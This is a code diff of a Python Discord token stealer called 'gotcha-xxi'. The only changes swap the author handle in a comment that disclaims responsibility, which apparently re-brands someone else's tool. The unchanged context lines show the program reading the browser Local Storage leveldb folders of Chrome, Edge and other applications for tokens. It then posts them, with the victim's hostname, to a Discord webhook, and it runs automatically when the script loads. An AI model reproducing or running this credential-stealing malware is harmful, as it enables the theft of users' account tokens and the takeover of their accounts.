@@ -1,6 +1,6 @@
 import requests, os, re
 from dhooks import Webhook, Embed
-#gotcha-xxi program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-xxi program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 def xxisniff(path):
     path += '\\Local Storage\\leveldb'
     tokens = []
@@ -29,7 +29,7 @@ def xxi():
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
         'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
     }
- #gotcha-xxi program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-xxi program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
     message = '\n'
     for platform, path in paths.items():
         if not os.path.exists(path):
@@ -49,5 +49,5 @@ def xxi():
         embed = Embed(title=f'{hostname}',color=16764108)
         embed.add_field("Tokens:",message)
         hook.send(embed=embed)
-#gotcha-xxi program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-xxi program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 xxi()
